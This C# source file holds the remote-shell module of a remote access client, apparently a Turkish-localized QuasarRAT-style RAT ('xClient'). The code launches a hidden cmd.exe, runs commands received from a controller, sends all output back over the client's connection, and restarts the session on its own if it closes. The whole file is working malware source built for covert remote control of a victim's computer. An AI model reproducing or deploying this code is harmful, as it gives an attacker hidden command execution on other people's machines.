using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

namespace xClient.KuuhakuÇekirdek.Utilityler
{
    public class Shell : IDisposable
    {
        private Process _prc;

        private bool _read;

        private readonly object _readLock = new object();

        private readonly object _readStreamLock = new object();

        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            CultureInfo cultureInfo = CultureInfo.InstalledUICulture;

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    StandardErrorEncoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage),
                    CreateNoWindow = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = "/K"
                }
            };

            _prc.Start();

            RedirectOutputs();

            new Paketler.ClientPaketleri.DoShellExecuteResponse(Environment.NewLine + ">> Yeni Oturum Başlatıldı" + Environment.NewLine).Execute(
                Program.ConnectClient);
        }

        private void RedirectOutputs()
        {
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardOutput(); });
            ThreadPool.QueueUserWorkItem((WaitCallback)delegate { RedirectStandardError(); });
        }

        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                StringBuilder streambuffer = new StringBuilder();

                streambuffer.Append((char)firstCharRead);

                while (streamReader.Peek() > -1)
                {
                    var ch = streamReader.Read();

                    streambuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streambuffer, isError);
                }
                SendAndFlushBuffer(ref streambuffer, isError);
            }
        }

        private void SendAndFlushBuffer(ref StringBuilder textbuffer, bool isError)
        {
            if (textbuffer.Length == 0) return;

            var toSend = textbuffer.ToString();

            if (string.IsNullOrEmpty(toSend)) return;

            if (isError)
            {
                new Paketler.ClientPaketleri.DoShellExecuteResponse(toSend, true).Execute(
                    Program.ConnectClient);
            }
            else
            {
                new Paketler.ClientPaketleri.DoShellExecuteResponse(toSend).Execute(
                    Program.ConnectClient);
            }

            textbuffer.Length = 0;
        }

        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("Oturum bilinmedik bir sebepten dolayı kapandı.");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Paketler.ClientPaketleri.DoShellExecuteResponse(string.Format("{0}>> Oturum bilinmedik bir sebepten dolayı kapandı{0}",
                        Environment.NewLine), true).Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        private void RedirectStandardError()
        {
            try
            {
                int ch;

                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("Oturum bilinmedik bir sebepten dolayı kapandı.");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    new Paketler.ClientPaketleri.DoShellExecuteResponse(string.Format("{0}>> Oturum bilinmedik bir sebepten dolayı kapandı.{0}",
                        Environment.NewLine), true).Execute(Program.ConnectClient);

                    CreateSession();
                }
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
                CreateSession();

            if (_prc == null) return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }
        public Shell()
        {
            CreateSession();
        }

 
        public void Dispose()
        {
            Dispose(true);

            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (_prc == null) return;

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }
                _prc.Dispose();
                _prc = null;
            }
        }
    }
}